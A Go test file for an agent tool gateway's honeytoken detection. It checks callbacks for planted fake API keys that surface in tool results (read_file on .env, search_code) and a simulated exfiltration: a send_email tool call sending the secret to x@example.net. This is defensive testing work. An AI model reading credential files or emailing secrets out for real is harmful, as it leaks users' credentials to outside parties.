package gateway

import (
	"strings"
	"testing"
)

// docs/M16-early-warning.md §4: the gateway half of the exit criterion.

func exposureConfig(t *testing.T) (Config, string) {
	t.Helper()
	cfg, honey := honeyConfig(t)
	cfg.Exposure = &Exposure{Token: "exposuretok"}
	return cfg, honey
}

func TestHoneyInResultWarnsOncePerTool(t *testing.T) {
	cfg, honey := exposureConfig(t)
	h := newHarness(t, cfg)

	reply := textResult(1, "PAYMENTS_API_KEY="+honey+"\nDEBUG=false")
	h.client(call(1, "read_file", `{"path":".env"}`))
	h.serverGets()
	h.server(reply)
	if got := h.clientGets(); got != reply {
		t.Fatalf("result not relayed unchanged: %q", got)
	}
	r := h.callback()
	q := r.URL.Query()
	if !strings.Contains(r.URL.Path, "exposuretok") || q.Get("layer") != "exposure" || q.Get("tool") != "read_file" || q.Get("session") != "stest01" {
		t.Fatalf("exposure callback: %s", r.URL)
	}
	if strings.Contains(r.URL.String(), honey) {
		t.Fatalf("honey value in the exposure URL: %s", r.URL)
	}
	// The newest ledger entry is the result that carried the value.
	if got, want := q.Get("in0"), "read_file~"+InputFingerprint("PAYMENTS_API_KEY="+honey+"\nDEBUG=false"); !strings.HasPrefix(got, want) {
		t.Fatalf("in0 = %q, want prefix %q", got, want)
	}

	// Same tool again: no second exposure.
	h.realCall(2, "read_file", `{"path":".env"}`, textResult(2, "again "+honey))
	h.noCallback()
	// Another tool returning it: one more.
	h.realCall(3, "search_code", `{"q":"KEY"}`, textResult(3, honey))
	if q := h.callback().URL.Query(); q.Get("layer") != "exposure" || q.Get("tool") != "search_code" {
		t.Fatalf("second tool: %v", q)
	}
}

func TestNoExposureWithoutAMatchOrConfig(t *testing.T) {
	cfg, honey := exposureConfig(t)
	h := newHarness(t, cfg)
	h.realCall(1, "read_file", `{"path":"README.md"}`, textResult(1, "nothing to see"))
	h.noCallback()

	off, _ := honeyConfig(t) // exposure not configured
	h = newHarness(t, off)
	h.realCall(1, "read_file", `{"path":".env"}`, textResult(1, honey))
	h.noCallback()
}

func TestEgressStillReportedWithExposureOn(t *testing.T) {
	cfg, honey := exposureConfig(t)
	h := newHarness(t, cfg)
	leak := call(1, "send_email", `{"to":"x@example.net","body":"`+honey+`"}`)
	h.client(leak)
	if got := h.serverGets(); got != leak {
		t.Fatalf("call not relayed: %q", got)
	}
	r := h.callback()
	if q := r.URL.Query(); !strings.Contains(r.URL.Path, honey) || q.Get("layer") != "egress" {
		t.Fatalf("egress callback: %s", r.URL)
	}
}

func TestExposureConfig(t *testing.T) {
	c := Config{CallbackURL: "http://x", Style: "catalog", Exposure: &Exposure{}}
	if c.Validate() == nil {
		t.Fatal("exposure without a token accepted")
	}
}
